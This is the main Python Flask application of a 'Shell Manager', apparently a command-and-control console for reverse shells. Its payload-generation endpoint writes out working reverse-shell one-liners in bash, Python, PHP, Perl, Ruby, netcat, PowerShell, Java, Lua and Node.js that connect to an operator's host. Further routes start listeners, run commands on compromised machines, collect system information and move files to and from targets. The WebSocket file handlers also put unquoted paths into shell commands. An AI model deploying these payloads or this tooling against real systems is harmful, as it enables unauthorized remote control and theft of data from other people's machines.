"""
Shell Manager - 主应用
"""
from flask import Flask, render_template, jsonify, request, redirect, url_for, session, flash, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from functools import wraps
import os
import re
import json
import shlex
import base64
import time
import platform
import subprocess

from config import Config, DEFAULT_ADMIN, get_admin_credentials
from extensions import db
from models import User
from shell_manager import shell_manager

app = Flask(__name__)
app.config.from_object(Config)
CORS(app)
socketio = SocketIO(
    app,
    cors_allowed_origins=app.config.get("SOCKETIO_CORS_ORIGINS", "*"),
    async_mode="threading",
)

DB_AVAILABLE = False


def _init_database() -> None:
    """绑定 SQLAlchemy、建表、按需创建管理员。"""
    global DB_AVAILABLE
    try:
        db.init_app(app)
        with app.app_context():
            db.create_all()
            creds = get_admin_credentials()
            admin = User.query.filter_by(username=creds["username"]).first()
            if not admin:
                admin = User(username=creds["username"])
                admin.set_password(creds["password"])
                db.session.add(admin)
                db.session.commit()
                print(f"已创建默认管理员账户: {creds['username']}")
        DB_AVAILABLE = True
    except Exception as e:
        print(f"数据库初始化失败，将仅使用 .env 中的管理员账号登录（不落库）: {e}")
        DB_AVAILABLE = False


_init_database()


# 登录验证装饰器
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('logged_in'):
            return f(*args, **kwargs)
        if request.path.startswith('/api/'):
            return jsonify({'success': False, 'error': '未登录', 'code': 'unauthorized'}), 401
        return redirect(url_for('login', next=request.path))
    return decorated_function


# CSRF保护
def csrf_token():
    import secrets
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(16)
    return session['_csrf_token']

app.jinja_env.globals['csrf_token'] = csrf_token


# ============ HTTP 路由 ============

@app.route('/login', methods=['GET', 'POST'])
def login():
    """登录页面"""
    if session.get('logged_in'):
        return redirect(url_for('index'))
    
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        remember = request.form.get('remember')
        session.permanent = bool(remember)
        
        # 简单验证（无数据库时使用默认账户）
        if DB_AVAILABLE and User:
            user = User.query.filter_by(username=username).first()
            if user and user.check_password(password):
                session['logged_in'] = True
                session['username'] = username
                user.last_login = db.func.now()
                db.session.commit()
                nxt = request.form.get('next') or request.args.get('next') or url_for('index')
                if not nxt.startswith('/') or nxt.startswith('//'):
                    nxt = url_for('index')
                return redirect(nxt)
            else:
                error = '用户名或密码错误'
        else:
            # 无数据库时使用配置文件中的默认账户
            if username == DEFAULT_ADMIN['username'] and password == DEFAULT_ADMIN['password']:
                session['logged_in'] = True
                session['username'] = username
                nxt = request.form.get('next') or request.args.get('next') or url_for('index')
                if not nxt.startswith('/') or nxt.startswith('//'):
                    nxt = url_for('index')
                return redirect(nxt)
            else:
                error = '用户名或密码错误'
    
    return render_template('login.html', error=error)


@app.route('/logout')
def logout():
    """登出（未登录时也可访问，用于清空会话）"""
    session.clear()
    return redirect(url_for('login'))


@app.route('/')
@login_required
def index():
    """首页"""
    return render_template('index.html')


@app.route('/hosts')
@login_required
def hosts():
    """主机管理页面"""
    return render_template('hosts.html')


@app.route('/terminal/<session_id>')
@login_required
def terminal(session_id):
    """终端页面"""
    return render_template('terminal.html', session_id=session_id)


@app.route('/files/<session_id>')
@login_required
def files(session_id):
    """文件管理页面"""
    return render_template('files.html', session_id=session_id)


@app.route('/ports')
@login_required
def ports():
    """端口管理页面"""
    return render_template('ports.html')


@app.route('/payload')
@login_required
def payload():
    """载荷生成页面"""
    return render_template('payload.html')


@app.route('/quickconnect')
@login_required
def quickconnect():
    """快速连接页面"""
    return render_template('quickconnect.html')


@app.route('/settings')
@login_required
def settings():
    """设置页面"""
    return render_template('settings.html')


@app.route('/help')
@login_required
def help_page():
    """帮助文档页面"""
    return render_template('help.html')


# ============ API 路由 ============

@app.route('/api/generate_payload', methods=['POST'])
@login_required
def generate_payload():
    """生成反弹Shell载荷"""
    data = request.json
    host = data.get('host', 'YOUR_IP')
    port = data.get('port', 4444)
    shell_type = data.get('type', 'bash')

    payloads = {
        'bash': f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'bash_udp': f'bash -i >& /dev/udp/{host}/{port} 0>&1',
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php_exec': f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'php_passthru': f"php -r '$sock=fsockopen(\"{host}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'nc': f'nc -e /bin/sh {host} {port}',
        'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f',
        'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        'java': f'Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{host}/{port} 0>&1"}})',
        'lua': f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        'nodejs': f"require('child_process').exec('nc -e /bin/sh {host} {port}')"
    }

    payload = payloads.get(shell_type, payloads['bash'])

    return jsonify({
        'success': True,
        'payload': payload,
        'type': shell_type,
        'host': host,
        'port': port
    })


@app.route('/api/listeners', methods=['GET'])
@login_required
def get_listeners():
    """获取所有监听器"""
    return jsonify({
        'success': True,
        'listeners': shell_manager.get_all_listeners()
    })


@app.route('/api/sessions', methods=['GET'])
@login_required
def get_sessions():
    """获取所有会话"""
    return jsonify({
        'success': True,
        'sessions': shell_manager.get_all_sessions()
    })


@app.route('/api/session/<session_id>', methods=['GET'])
@login_required
def get_session(session_id):
    """获取会话信息"""
    session_obj = shell_manager.get_session(session_id)
    if session_obj:
        return jsonify({
            'success': True,
            'session': session_obj.to_dict()
        })
    return jsonify({
        'success': False,
        'error': '会话不存在'
    }), 404


@app.route('/api/session/<session_id>/delete', methods=['POST'])
@login_required
def delete_session(session_id):
    """删除会话记录"""
    success = shell_manager.delete_session(session_id)
    return jsonify({'success': success})


@app.route('/api/check_port/<int:port>', methods=['GET'])
@login_required
def check_port(port):
    """检查端口是否可用"""
    import socket as s
    sock = s.socket(s.AF_INET, s.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    sock.close()
    available = result != 0
    return jsonify({
        'success': True,
        'port': port,
        'available': available
    })


@app.route('/api/system_info', methods=['GET'])
@login_required
def system_info():
    """获取系统信息"""
    return jsonify({
        'success': True,
        'platform': platform.system(),
        'platform_version': platform.version(),
        'python_version': platform.python_version()
    })


@app.route('/api/firewall/open', methods=['POST'])
@login_required
def open_firewall_port():
    """打开防火墙端口"""
    data = request.json
    port = data.get('port')
    protocol = data.get('protocol', 'tcp')

    if not port:
        return jsonify({'success': False, 'error': '端口不能为空'}), 400

    system = platform.system()

    try:
        if system == 'Windows':
            cmd = f'netsh advfirewall firewall add rule name="ShellPort_{port}" dir=in action=allow protocol={protocol} localport={port}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        elif system == 'Linux':
            cmd = f'iptables -I INPUT -p {protocol} --dport {port} -j ACCEPT'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            return jsonify({'success': False, 'error': '不支持的操作系统'}), 400

        if result.returncode == 0:
            return jsonify({'success': True, 'message': f'端口 {port} 已开放'})
        else:
            return jsonify({'success': False, 'error': result.stderr}), 500
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/firewall/close', methods=['POST'])
@login_required
def close_firewall_port():
    """关闭防火墙端口"""
    data = request.json
    port = data.get('port')
    protocol = data.get('protocol', 'tcp')

    if not port:
        return jsonify({'success': False, 'error': '端口不能为空'}), 400

    system = platform.system()

    try:
        if system == 'Windows':
            cmd = f'netsh advfirewall firewall delete rule name="ShellPort_{port}" protocol={protocol} localport={port}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        elif system == 'Linux':
            cmd = f'iptables -D INPUT -p {protocol} --dport {port} -j ACCEPT'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            return jsonify({'success': False, 'error': '不支持的操作系统'}), 400

        return jsonify({'success': True, 'message': f'端口 {port} 已关闭'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============ 文件管理 API（跨平台：优先 Python，回退 ls/dir 与 base64） ============

def _run_remote_python(session_id: str, code: str, timeout: float = 25.0) -> str:
    """在目标机执行多行 Python（bash/sh 环境）。失败时返回空串。"""
    q = shlex.quote(code)
    return shell_manager.execute_command_wait(
        session_id,
        f"python3 -c {q} 2>/dev/null || python -c {q} 2>/dev/null",
        timeout=timeout,
    )


def _py_listdir_code(path: str) -> str:
    return (
        "import os,json\n"
        f"r=os.path.abspath(os.path.expanduser(os.path.expandvars({repr(path)})))\n"
        "o=[]\n"
        "for n in sorted(os.listdir(r), key=str.lower):\n"
        "    if n in ('.', '..'): continue\n"
        "    p=os.path.join(r, n)\n"
        "    try:\n"
        "        st=os.stat(p)\n"
        "        o.append({'name':n,'dir':bool(os.path.isdir(p)),"
        "'size':st.st_size if os.path.isfile(p) else 0,'mtime':st.st_mtime,"
        "'perm':oct(st.st_mode)[-3:]})\n"
        "    except OSError:\n"
        "        pass\n"
        "print('__SM_JSON__'+json.dumps(o))\n"
    )


def _extract_json_after_marker(raw: str, marker: str = "__SM_JSON__"):
    if marker not in raw:
        return None
    tail = raw.split(marker, 1)[1].strip()
    for line in tail.splitlines():
        line = line.strip()
        if line.startswith("["):
            try:
                return json.loads(line)
            except json.JSONDecodeError:
                continue
    start = tail.find("[")
    if start < 0:
        return None
    depth = 0
    for i, c in enumerate(tail[start:], start):
        if c == "[":
            depth += 1
        elif c == "]":
            depth -= 1
            if depth == 0:
                try:
                    return json.loads(tail[start : i + 1])
                except json.JSONDecodeError:
                    return None
    return None


def _strip_b64_payload(raw: str) -> str:
    """从命令输出中提取纯 Base64。"""
    if not raw:
        return ""
    compact = re.sub(r"\s+", "", raw)
    m = re.fullmatch(r"[A-Za-z0-9+/=]+", compact)
    if m:
        return compact
    m2 = re.search(r"[A-Za-z0-9+/=]{16,}", compact)
    return m2.group(0) if m2 else compact.strip()


@app.route('/api/session/<session_id>/list', methods=['POST'])
@login_required
def list_files(session_id):
    """列出目录：优先 JSON 结构化列表，否则回退 ls/dir 文本。"""
    data = request.json or {}
    path = data.get('path') or "/"

    raw_py = _run_remote_python(session_id, _py_listdir_code(path), timeout=22.0)
    items = _extract_json_after_marker(raw_py)
    if items is not None:
        return jsonify({"success": True, "format": "json", "items": items, "path": path})

    pq = path.replace("'", "'\"'\"'")
    cmd = f"ls -la '{pq}' 2>&1 || ls -la {shlex.quote(path)} 2>&1 || dir {shlex.quote(path)} 2>&1"
    result = shell_manager.execute_command_wait(session_id, cmd, timeout=18.0)
    return jsonify({"success": True, "format": "text", "output": result or "", "path": path})


@app.route('/api/session/<session_id>/download', methods=['POST'])
@login_required
def download_file(session_id):
    """下载文件：Base64；优先 Python 读二进制，回退 Unix base64 / PowerShell。"""
    data = request.json or {}
    filepath = data.get("path", "").strip()
    if not filepath:
        return jsonify({"success": False, "error": "文件路径不能为空"}), 400

    code = (
        "import os,base64,sys\n"
        f"p=os.path.abspath(os.path.expanduser(os.path.expandvars({repr(filepath)})))\n"
        "if not os.path.isfile(p):\n"
        "    sys.exit(1)\n"
        "sys.stdout.write(base64.standard_b64encode(open(p,'rb').read()).decode('ascii'))\n"
    )
    result = _run_remote_python(session_id, code, timeout=120.0)
    b64 = _strip_b64_payload(result) if result else ""
    if b64 and len(b64) > 8:
        try:
            base64.standard_b64decode(b64, validate=False)
            return jsonify(
                {
                    "success": True,
                    "data": b64,
                    "filename": os.path.basename(filepath.replace("\\", "/")),
                }
            )
        except Exception:
            pass

    qf = shlex.quote(filepath)
    result2 = shell_manager.execute_command_wait(
        session_id,
        f"base64 -w 0 {qf} 2>/dev/null || base64 {qf} 2>/dev/null",
        timeout=120.0,
    )
    b64 = _strip_b64_payload(result2) if result2 else ""
    if b64:
        return jsonify(
            {
                "success": True,
                "data": b64,
                "filename": os.path.basename(filepath.replace("\\", "/")),
            }
        )

    fp_esc = filepath.replace("'", "''")
    ps = f"[Convert]::ToBase64String([IO.File]::ReadAllBytes([string]'{fp_esc}'))"
    result3 = shell_manager.execute_command_wait(
        session_id,
        f"powershell -NoProfile -EncodedCommand {base64.b64encode(ps.encode('utf-16-le')).decode('ascii')}",
        timeout=120.0,
    )
    b64 = _strip_b64_payload(result3) if result3 else ""
    if b64:
        return jsonify(
            {
                "success": True,
                "data": b64,
                "filename": os.path.basename(filepath.replace("\\", "/")),
            }
        )

    return jsonify({"success": False, "error": "无法读取文件（目标需 Python 或 base64/PowerShell）"}), 404


@app.route('/api/session/<session_id>/upload', methods=['POST'])
@login_required
def upload_file(session_id):
    """上传文件：分块写入，避免命令行长度限制与 shell 注入。"""
    data = request.json or {}
    filepath = (data.get("path") or "").strip()
    filedata = data.get("data") or ""

    if not filepath or not filedata:
        return jsonify({"success": False, "error": "文件路径和数据不能为空"}), 400

    chunk_size = 2800
    for i in range(0, len(filedata), chunk_size):
        part = filedata[i : i + chunk_size]
        mode = "ab" if i > 0 else "wb"
        inner = (
            "import base64\n"
            f"open({repr(filepath)},{repr(mode)}).write(base64.b64decode({repr(part)}))\n"
        )
        q = shlex.quote(inner)
        shell_manager.execute_command_wait(
            session_id,
            f"python3 -c {q} 2>/dev/null || python -c {q} 2>/dev/null",
            timeout=90.0,
        )

    return jsonify({"success": True})


@app.route('/api/session/<session_id>/fs-mkdir', methods=['POST'])
@login_required
def mkdir_remote(session_id):
    """创建目录（含多级）。"""
    data = request.json or {}
    path = (data.get("path") or "").strip()
    if not path:
        return jsonify({"success": False, "error": "路径不能为空"}), 400

    code = (
        "import os\n"
        f"os.makedirs(os.path.abspath(os.path.expanduser(os.path.expandvars({repr(path)}))), exist_ok=True)\n"
    )
    _run_remote_python(session_id, code, timeout=15.0)
    return jsonify({"success": True})


@app.route('/api/session/<session_id>/fs-delete', methods=['POST'])
@login_required
def delete_remote_file(session_id):
    """删除远程文件或空目录（不递归删目录）。"""
    data = request.json or {}
    path = (data.get("path") or "").strip()
    if not path:
        return jsonify({"success": False, "error": "路径不能为空"}), 400

    code = (
        "import os\n"
        f"p=os.path.abspath(os.path.expanduser(os.path.expandvars({repr(path)})))\n"
        "if os.path.isfile(p):\n"
        "    os.remove(p)\n"
        "elif os.path.isdir(p):\n"
        "    os.rmdir(p)\n"
    )
    _run_remote_python(session_id, code, timeout=15.0)
    pq = shlex.quote(path)
    shell_manager.execute_command_wait(
        session_id,
        f"rm -f {pq} 2>/dev/null; rmdir {pq} 2>/dev/null",
        timeout=8.0,
    )
    return jsonify({"success": True})


# ============ WebSocket 事件 ============

@socketio.on('connect')
def handle_connect():
    """客户端连接（须已登录，否则拒绝）"""
    if not session.get('logged_in'):
        return False
    emit('connected', {'status': 'ok'})


@socketio.on('start_listener')
def handle_start_listener(data):
    """启动监听器"""
    port = data.get('port', 4444)
    success = shell_manager.start_listener(port)
    if success:
        emit('listener_started', {'port': port, 'success': True})
    else:
        emit('listener_started', {'port': port, 'success': False, 'error': '端口已被使用或启动失败'})


@socketio.on('stop_listener')
def handle_stop_listener(data):
    """停止监听器"""
    port = data.get('port')
    success = shell_manager.stop_listener(port)
    emit('listener_stopped', {'port': port, 'success': success})


@socketio.on('execute_command')
def handle_execute_command(data):
    """执行命令"""
    session_id = data.get('session_id')
    command = data.get('command', '')
    success = shell_manager.execute_command(session_id, command)
    if not success:
        emit('command_error', {'session_id': session_id, 'error': '会话不存在或已断开'})


@socketio.on('close_session')
def handle_close_session(data):
    """关闭会话"""
    session_id = data.get('session_id')
    shell_manager.close_session(session_id)
    emit('session_closed', {'session_id': session_id})


@socketio.on('delete_session')
def handle_delete_session(data):
    """删除会话记录"""
    session_id = data.get('session_id')
    shell_manager.delete_session(session_id)
    emit('session_deleted', {'session_id': session_id})


@socketio.on('collect_info')
def handle_collect_info(data):
    """收集系统信息"""
    session_id = data.get('session_id')
    success = shell_manager.collect_system_info(session_id)
    if success:
        emit('info_collecting', {'session_id': session_id, 'success': True})
    else:
        emit('info_collecting', {'session_id': session_id, 'success': False, 'error': '会话不存在或已断开'})


@socketio.on('file_list')
def handle_file_list(data):
    """列出文件"""
    session_id = data.get('session_id')
    path = data.get('path', '/')
    shell_manager.execute_command(session_id, f'ls -la "{path}" 2>/dev/null || dir "{path}"')


@socketio.on('file_download')
def handle_file_download(data):
    """下载文件"""
    session_id = data.get('session_id')
    filepath = data.get('path', '')
    shell_manager.execute_command(session_id, f'base64 "{filepath}"')


@socketio.on('file_upload')
def handle_file_upload(data):
    """上传文件"""
    session_id = data.get('session_id')
    filepath = data.get('path', '')
    filedata = data.get('data', '')
    shell_manager.execute_command(session_id, f'echo "{filedata}" | base64 -d > "{filepath}"')


# ============ 设置回调 ============

def on_new_session(session):
    """新会话回调"""
    socketio.emit('new_session', session)


def on_session_output(session_id, output):
    """会话输出回调"""
    socketio.emit('session_output', {'session_id': session_id, 'output': output})


def on_session_closed(session_id):
    """会话关闭回调"""
    socketio.emit('session_disconnected', {'session_id': session_id})


def on_session_info(session_id, info):
    """系统信息回调"""
    socketio.emit('session_info', {'session_id': session_id, 'info': info})


shell_manager.set_callbacks(
    on_new_session=on_new_session,
    on_session_output=on_session_output,
    on_session_closed=on_session_closed,
    on_session_info=on_session_info
)


if __name__ == "__main__":
    _port = int(app.config.get("WEB_PORT", 5000))
    _host = app.config.get("WEB_HOST", "0.0.0.0")
    _debug = bool(app.config.get("FLASK_DEBUG", False))
    print(
        f"""
    ╔════════════════════════════════════════════════════╗
    ║       Shell Manager                             ║
    ╠════════════════════════════════════════════════════╣
    ║  访问: http://127.0.0.1:{_port}                      ║
    ║  配置: .env（SECRET_KEY / 数据库 / ADMIN_*）         ║
    ║  按 Ctrl+C 停止                                    ║
    ╚════════════════════════════════════════════════════╝
    """
    )
    socketio.run(
        app,
        host=_host,
        port=_port,
        debug=_debug,
        allow_unsafe_werkzeug=True,
    )
